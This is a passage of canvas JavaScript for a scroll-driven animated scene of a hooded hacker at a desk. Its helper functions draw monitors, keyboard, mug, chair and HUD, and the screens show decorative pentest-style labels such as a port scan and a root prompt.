    ctx.fillStyle = 'rgba(0,18,30,0.75)';
    ctx.fillRect(cx + 18, cy - 28, 84, 52);
    ctx.font = '5.5px "Share Tech Mono"';
    ['nmap -sC -sV', '80/tcp open', '/upload 200', 'shell.php ✓', 'uid=0(root)', 'RCE CONF.'].forEach((l, i) => {
      ctx.fillStyle = 'rgba(0,212,255,0.7)';
      ctx.fillText(l, cx + 22, cy - 17 + i * 8);
    });
    ctx.restore();

    /* eyes */
    const blinkH = t % 280 < 8 ? 2 : 10;
    ctx.fillStyle = '#0a1520';
    ctx.beginPath(); ctx.ellipse(cx - 59, cy - 5, 26, blinkH, 0, 0, Math.PI*2); ctx.fill();
    ctx.beginPath(); ctx.ellipse(cx + 59, cy - 5, 26, blinkH, 0, 0, Math.PI*2); ctx.fill();
    if (blinkH > 4) {
      const iris = 0.7 + 0.2 * Math.sin(t * 0.04);
      ctx.fillStyle = `rgba(0,212,255,${iris})`;
      circle(cx - 59, cy - 5, 7, null);
      ctx.fill();
      circle(cx + 59, cy - 5, 7, null);
      ctx.fill();
      ctx.fillStyle = '#000';
      circle(cx - 59, cy - 5, 3.5, null); ctx.fill();
      circle(cx + 59, cy - 5, 3.5, null); ctx.fill();
    }

    /* mouth — focused */
    ctx.strokeStyle = 'rgba(60,80,100,0.55)';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(cx - 24, cy + 62);
    ctx.bezierCurveTo(cx - 10, cy + 65, cx + 10, cy + 65, cx + 24, cy + 62);
    ctx.stroke();

    /* headphones */
    ctx.strokeStyle = 'rgba(20,20,48,0.95)';
    ctx.lineWidth = 10;
    ctx.beginPath();
    ctx.arc(cx, cy - 55, 100, Math.PI, Math.PI * 2);
    ctx.stroke();
    ctx.fillStyle = '#14142a';
    ctx.strokeStyle = 'rgba(0,212,255,0.22)';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.ellipse(cx - 100, cy - 18, 18, 24, 0.3, 0, Math.PI*2);
    ctx.fill(); ctx.stroke();
    ctx.beginPath();
    ctx.ellipse(cx + 100, cy - 18, 18, 24, -0.3, 0, Math.PI*2);
    ctx.fill(); ctx.stroke();

    /* hoodie collar */
    ctx.fillStyle = '#06090e';
    ctx.strokeStyle = 'rgba(0,255,136,0.08)';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(cx - 115, cy + 250);
    ctx.quadraticCurveTo(cx - 78, cy + 148, cx - 28, cy + 132);
    ctx.lineTo(cx, cy + 140);
    ctx.lineTo(cx + 28, cy + 132);
    ctx.quadraticCurveTo(cx + 78, cy + 148, cx + 115, cy + 250);
    ctx.lineTo(cx + 300, cy + 500);
    ctx.lineTo(cx - 300, cy + 500);
    ctx.closePath();
    ctx.fill(); ctx.stroke();
  }

  /* ═══════════════════════════════════════════
     COMPONENT HELPERS
  ═══════════════════════════════════════════ */
  function drawMonitor (x, y, w, h, gColor, side) {
    // bezel
    ctx.fillStyle = '#090c10';
    ctx.strokeStyle = gColor === '#00ff88'
      ? 'rgba(0,255,136,0.2)' : 'rgba(0,212,255,0.2)';
    ctx.lineWidth = 1.5;
    rr(x - 10, y - 10, w + 20, h + 20, 5); ctx.fill(); ctx.stroke();

    // screen
    ctx.fillStyle = '#030805';
    ctx.shadowBlur = 10; ctx.shadowColor = gColor;
    rr(x, y, w, h, 3); ctx.fill();
    ctx.strokeStyle = gColor + '44';
    rr(x, y, w, h, 3); ctx.stroke();
    ctx.shadowBlur = 0;

    // title bar
    ctx.fillStyle = '#0d1117';
    ctx.fillRect(x, y, w, 18);
    circle(x+8,  y+9, 3.5, '#ff4757');
    circle(x+18, y+9, 3.5, '#ffdd59');
    circle(x+28, y+9, 3.5, '#00ff88');

    // clip to screen area
    ctx.save();
    rr(x, y+18, w, h-18, 2); ctx.clip();

    ctx.font = '7px "Share Tech Mono"';

    if (side === 'center') {
      // live terminal output
      const show = termBuf.slice(-Math.floor((h - 22) / 11));
      show.forEach((ln, i) => {
        ctx.fillStyle = ln.startsWith('~$') ? '#00ff88'
          : ln.includes('[!]') || ln.includes('root') ? '#ff4757'
          : 'rgba(0,255,136,0.45)';
        ctx.fillText(ln.slice(0, 38), x + 5, y + 30 + i * 11);
      });
      // cursor
      if (t % 60 < 30) {
        ctx.fillStyle = '#00ff88';
        ctx.fillRect(x+5, y+30 + show.length*11-9, 5, 8);
      }
    } else if (side === 'left') {
      ctx.fillStyle = 'rgba(0,212,255,0.7)';
      ctx.fillText('GET /upload HTTP/1.1', x+5, y+30);
      ctx.fillStyle = 'rgba(0,255,136,0.5)';
      ['Host: target.local', 'Content-Type: multipart/form-data',
       '', '< HTTP/1.1 200 OK', '< Content-Length: 892'].forEach((l,i) =>
        ctx.fillText(l, x+5, y+42+i*11));
      ctx.fillStyle = '#ff4757';
      ctx.fillRect(x, y+h-18, w, 18);
      ctx.fillStyle = '#fff';
      ctx.fillText('200 OK  892B  34ms', x+5, y+h-5);
    } else {
      // system monitor
      const bars = [82, 61, 45, 90];
      const lbs  = ['CPU','MEM','DSK','NET'];
      bars.forEach((v, i) => {
        ctx.fillStyle = 'rgba(0,255,136,0.25)';
        ctx.fillText(lbs[i], x+5, y+30+i*16);
        ctx.fillStyle = '#0d1117';
        ctx.fillRect(x+28, y+22+i*16, w-38, 9);
        const aw = (v / 100) * (w - 40);
        const barC = v > 80 ? '#ff4757' : '#00ff88';
        ctx.fillStyle = barC;
        ctx.fillRect(x+29, y+23+i*16, aw, 7);
        ctx.fillStyle = 'rgba(255,255,255,0.4)';
        ctx.fillText(`${v}%`, x+w-26, y+30+i*16);
      });
      // mini waveform
      for (let bi = 0; bi < 22; bi++) {
        const bh = 6 + 16 * Math.abs(Math.sin(t * 0.055 + bi * 0.85));
        ctx.fillStyle = `rgba(0,255,136,${0.25 + 0.3*(bi/22)})`;
        ctx.fillRect(x + 8 + bi * 9, y + h - 28 - bh, 7, bh);
      }
    }
    ctx.restore();
  }

  function drawMonitorStand (x, y, w, h) {
    ctx.fillStyle = '#090c10';
    ctx.fillRect(x - w*0.25, y - h, w*0.5, h);
    rr(x - w, y, w*2, 7, 2);
    ctx.fill();
  }

  function drawKeyboard (x, y, w, h) {
    ctx.fillStyle = '#0c1018';
    ctx.strokeStyle = 'rgba(0,255,136,0.12)';
    ctx.lineWidth = 1;
    rr(x, y, w, h, 4); ctx.fill(); ctx.stroke();

    const cols = 14, rows = 4;
    const kw = (w-18)/cols, kh = (h-18)/rows;
    for (let r = 0; r < rows; r++) {
      for (let c = 0; c < cols; c++) {
        const active = (t + r*7 + c*13) % 22 === 0;
        ctx.fillStyle = active ? 'rgba(0,255,136,0.4)' : '#111820';
        ctx.strokeStyle = active ? 'rgba(0,255,136,0.7)' : 'rgba(0,255,136,0.06)';
        ctx.lineWidth = 0.5;
        rr(x+9+c*kw, y+9+r*kh, kw-2, kh-2, 2); ctx.fill(); ctx.stroke();
      }
    }
    // space bar
    ctx.fillStyle = '#111820';
    rr(x+w*0.26, y+h-13, w*0.48, 9, 2); ctx.fill();
  }

  function drawMouse (x, y, w, h) {
    ctx.fillStyle = '#0c1018';
    ctx.strokeStyle = 'rgba(0,255,136,0.12)';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.ellipse(x, y+h*0.5, w/2, h/2, 0, 0, Math.PI*2);
    ctx.fill(); ctx.stroke();
    ctx.fillStyle = 'rgba(0,255,136,0.18)';
    ctx.fillRect(x-3, y+h*0.2, 6, 12);
    ctx.strokeStyle = 'rgba(0,255,136,0.08)';
    ctx.beginPath();
    ctx.moveTo(x, y+6); ctx.lineTo(x, y+h*0.45); ctx.stroke();
  }

  function drawMug (x, y, w, h) {
    ctx.fillStyle = '#111820';
    ctx.strokeStyle = 'rgba(0,255,136,0.18)';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(x-w/2+2, y); ctx.lineTo(x+w/2-2, y);
    ctx.lineTo(x+w/2, y+h); ctx.lineTo(x-w/2, y+h);
    ctx.closePath(); ctx.fill(); ctx.stroke();
    ctx.beginPath();
    ctx.arc(x+w/2+6, y+h*0.5, 8, -Math.PI*0.5, Math.PI*0.5); ctx.stroke();
    const sa = 0.25 + 0.2*Math.sin(t*0.04);
    ctx.strokeStyle = `rgba(200,200,200,${sa})`;
    ctx.lineWidth = 1.5;
    for (const dx of [-4, 4]) {
      ctx.beginPath();
      ctx.moveTo(x+dx, y-4);
      ctx.bezierCurveTo(x+dx*2, y-12, x, y-16, x+dx, y-22);
      ctx.stroke();
    }
  }

  function drawChair (cx, deskY, floorY) {
    const ch = floorY - deskY - 8;
    ctx.fillStyle = '#090d14';
    ctx.strokeStyle = 'rgba(0,255,136,0.08)';
    ctx.lineWidth = 1;
    rr(cx-58, deskY+28, 116, ch*0.52, 4); ctx.fill(); ctx.stroke();
    rr(cx-63, deskY+ch*0.52+18, 126, 28, 4); ctx.fill(); ctx.stroke();
    rr(cx-42, deskY+18, 84, 22, 4); ctx.fill(); ctx.stroke();
    rr(cx-78, deskY+ch*0.38, 20, 48, 3); ctx.fill(); ctx.stroke();
    rr(cx+58, deskY+ch*0.38, 20, 48, 3); ctx.fill(); ctx.stroke();
    ctx.strokeStyle = 'rgba(0,255,136,0.06)';
    ctx.lineWidth = 8;
    const legY = deskY+ch*0.52+46;
    [[cx-42,cx-52],[cx+42,cx+52],[cx-18,cx-8],[cx+18,cx+8]].forEach(([lx,fx]) => {
      ctx.beginPath(); ctx.moveTo(lx, legY); ctx.lineTo(fx, floorY-5); ctx.stroke();
    });
  }

  function drawLaptopTopdown (x, y, w, h) {
    // screen
    ctx.fillStyle = '#030805';
    ctx.strokeStyle = 'rgba(0,212,255,0.3)';
    ctx.lineWidth = 2;
    ctx.shadowBlur = 12; ctx.shadowColor = '#00d4ff';
    rr(x, y, w, h*0.54, 4); ctx.fill(); ctx.stroke();
    ctx.shadowBlur = 0;

    ctx.font = '7px "Share Tech Mono"';
    termBuf.slice(-9).forEach((ln, i) => {
      ctx.fillStyle = ln.startsWith('~$') ? '#00ff88' : 'rgba(0,255,136,0.4)';
      ctx.fillText(ln.slice(0, 44), x+8, y+12+i*10);
    });

    // keyboard base
    ctx.fillStyle = '#0c1018';
    ctx.strokeStyle = 'rgba(0,255,136,0.12)';
    ctx.lineWidth = 1;
    rr(x, y+h*0.54, w, h*0.46, 4); ctx.fill(); ctx.stroke();

    for (let r=0; r<4; r++) {
      for (let c=0; c<14; c++) {
        const active = (t+r*7+c*13)%22===0;
        ctx.fillStyle = active ? 'rgba(0,255,136,0.4)' : '#111820';
        rr(x+8+c*(w-18)/14, y+h*0.57+r*(h*0.34)/4, (w-22)/14, (h*0.3)/4, 1);
        ctx.fill();
      }
    }
  }

  function drawPaper (x, y, w, h, deg, lines) {
    ctx.save();
    ctx.translate(x+w/2, y+h/2);
    ctx.rotate(deg*Math.PI/180);
    ctx.shadowBlur = 10; ctx.shadowColor = 'rgba(0,0,0,0.6)';
    ctx.fillStyle = '#f2eedd';
    ctx.fillRect(-w/2, -h/2, w, h);
    ctx.shadowBlur = 0;
    ctx.strokeStyle = 'rgba(0,0,0,0.08)';
    ctx.lineWidth = 1;
    ctx.strokeRect(-w/2, -h/2, w, h);
    // ruled lines
    for (let i=0; i<22; i++) {
      ctx.strokeStyle = 'rgba(0,0,180,0.05)';
      ctx.beginPath();
      ctx.moveTo(-w/2+10, -h/2+32+i*15);
      ctx.lineTo(w/2-10, -h/2+32+i*15);
      ctx.stroke();
    }
    ctx.textAlign = 'left';
    lines.forEach((item, i) => {
      if (!item.t) return;
      ctx.fillStyle = item.c || '#333';
      ctx.font = (item.b ? 'bold ' : '') + '8.5px "Share Tech Mono"';
      ctx.fillText(item.t, -w/2+10, -h/2+18+i*15);
    });
    ctx.restore();
  }

  function drawSticky (x, y, w, h, color, lines) {
    ctx.shadowBlur = 7; ctx.shadowColor = 'rgba(0,0,0,0.45)';
    ctx.fillStyle = color;
    ctx.fillRect(x, y, w, h);
    ctx.shadowBlur = 0;
    ctx.fillStyle = 'rgba(0,0,0,0.1)';
    ctx.fillRect(x, y, w, 5);
    ctx.font = '8.5px "Share Tech Mono"';
    lines.forEach((line, i) => {
      ctx.fillStyle = 'rgba(0,0,0,0.72)';
      ctx.fillText(line, x+8, y+18+i*13);
    });
  }

  function drawPen (x, y, angleDeg) {
    ctx.save();
    ctx.translate(x, y);
    ctx.rotate(angleDeg*Math.PI/180);
    ctx.fillStyle = '#1a2a3a'; ctx.fillRect(-4,-68,8,115);
    ctx.fillStyle = '#00ff88'; ctx.fillRect(2,-64,2,78);
    ctx.fillStyle = '#c9d1d9';
    ctx.beginPath();
    ctx.moveTo(-4,47); ctx.lineTo(4,47); ctx.lineTo(0,62);
    ctx.closePath(); ctx.fill();
    ctx.fillStyle = '#c0a060'; ctx.fillRect(-4,-72,8,8);
    ctx.restore();
  }

  function drawCoffeeRing (x, y, r) {
    ctx.strokeStyle = 'rgba(100,65,30,0.22)';
    ctx.lineWidth = 2.5;
    ctx.beginPath(); ctx.arc(x, y, r, 0, Math.PI*2); ctx.stroke();
    ctx.strokeStyle = 'rgba(100,65,30,0.10)';
    ctx.lineWidth = 1;
    ctx.beginPath(); ctx.arc(x, y, r-3, 0, Math.PI*2); ctx.stroke();
  }

  function drawPaperClip (x, y) {
    ctx.strokeStyle = 'rgba(140,140,160,0.55)';
    ctx.lineWidth = 3; ctx.lineCap = 'round';
    ctx.beginPath();
    ctx.moveTo(x, y+22);
    ctx.arcTo(x-13, y+22, x-13, y, 13);
    ctx.arcTo(x-13, y, x+9, y, 13);
    ctx.arcTo(x+9, y, x+9, y+28, 9);
    ctx.arcTo(x+9, y+28, x-4, y+28, 9);
    ctx.lineTo(x-4, y+10);
    ctx.stroke();
  }

  /* ── HUD overlay ──────────────────────────── */
  function drawHUD () {
    // progress bar
    ctx.fillStyle = 'rgba(0,255,136,0.08)';
    ctx.fillRect(0, 0, W, 2);
    ctx.fillStyle = '#00ff88';
    ctx.fillRect(0, 0, W * scrollProg, 2);

    // caption
    if (captionAlpha > 0.02) {
      ctx.globalAlpha = captionAlpha;
      ctx.font = '11px "Share Tech Mono"';
      ctx.fillStyle = '#00ff88';
      ctx.fillText(captionLabel, 60, H - 72);
      ctx.font = '13px "Share Tech Mono"';
      ctx.fillStyle = 'rgba(201,209,217,0.85)';
      ctx.fillText(captionSub, 60, H - 50);
      ctx.globalAlpha = 1;
    }

    // scroll hint
    if (scrollProg < 0.04) {
      const a = 0.5 + 0.4 * Math.sin(t * 0.05);
      ctx.globalAlpha = a;
      ctx.font = '11px "Share Tech Mono"';
      ctx.fillStyle = 'rgba(0,255,136,0.8)';
      ctx.textAlign = 'center';
      ctx.fillText('scroll to explore', W/2, H - 36);
      ctx.fillText('↓', W/2, H - 18 + 4*Math.sin(t*0.09));
      ctx.textAlign = 'left';
      ctx.globalAlpha = 1;
    }

    // scene counter
    const si = STOPS.findIndex((s, i) =>
      scrollProg >= s.prog && (i === STOPS.length-1 || scrollProg < STOPS[i+1].prog));
    ctx.font = '10px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,255,136,0.38)';
    ctx.textAlign = 'right';
    ctx.fillText(`SCENE ${si+1} / ${STOPS.length}`, W-30, H-30);
    ctx.textAlign = 'left';
  }

  /* ── tiny draw utils ──────────────────────── */
  function rr (x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x+r, y);
    ctx.lineTo(x+w-r, y); ctx.quadraticCurveTo(x+w, y, x+w, y+r);
    ctx.lineTo(x+w, y+h-r); ctx.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
    ctx.lineTo(x+r, y+h); ctx.quadraticCurveTo(x, y+h, x, y+h-r);
    ctx.lineTo(x, y+r); ctx.quadraticCurveTo(x, y, x+r, y);
    ctx.closePath();
  }

  function circle (x, y, r, color) {
    if (color) ctx.fillStyle = color;
    ctx.beginPath(); ctx.arc(x, y, r, 0, Math.PI*2);
    if (color) ctx.fill();
  }

  function radialGlow (x, y, r, color) {
    const g = ctx.createRadialGradient(x, y, 0, x, y, r);
    g.addColorStop(0, color); g.addColorStop(1, 'transparent');
    ctx.fillStyle = g;
    ctx.fillRect(x-r, y-r, r*2, r*2);
  }

  function drawGrid (x, y, w, h, color) {
    ctx.strokeStyle = color; ctx.lineWidth = 0.5;
    for (let gx=x; gx<x+w; gx+=40) {
      ctx.beginPath(); ctx.moveTo(gx, y); ctx.lineTo(gx, y+h); ctx.stroke();
    }
    for (let gy=y; gy<y+h; gy+=40) {
      ctx.beginPath(); ctx.moveTo(x, gy); ctx.lineTo(x+w, gy); ctx.stroke();
    }
  }

  function bracket (x, y, size, color, flipX, flipY) {
    const dx = flipX ? -1 : 1, dy = flipY ? -1 : 1;
    ctx.strokeStyle = color; ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(x + dx*size, y);
    ctx.lineTo(x, y);
    ctx.lineTo(x, y + dy*size);
    ctx.stroke();
  }

  function sceneLabel (x, y, text) {
    ctx.font = '11px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,255,136,0.18)';
    ctx.fillText(text, x, y);
  }

  /* ── start ────────────────────────────────── */
  resize();
  window.addEventListener('resize', resize, { passive: true });
  setupScroll();
  loop();

})();
